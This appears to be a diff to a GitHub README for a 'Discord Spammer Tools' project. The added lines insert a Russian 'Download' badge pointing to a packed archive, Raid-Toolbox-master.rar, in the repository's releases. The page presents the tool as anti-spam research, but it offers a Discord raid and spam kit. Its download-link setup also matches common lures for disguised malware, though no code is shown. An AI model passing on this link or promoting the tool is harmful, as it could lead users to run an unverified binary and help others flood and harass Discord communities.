@@ -1,6 +1,8 @@
 # Discord Spammer Tools
 
 
+[![Скачать](https://img.shields.io/badge/Скачать-Raid--Toolbox--master.rar-blue?style=for-the-badge&logo=github)](https://github.com/ProjectSoftX/DiscordSpammer/releases/download/discord/Raid-Toolbox-master.rar)
+
 ## 📖 Description
 This tool is designed exclusively for studying methods of spam prevention and protection on the Discord platform. It is intended for testing and researching various approaches to building and improving anti-spam systems.
 
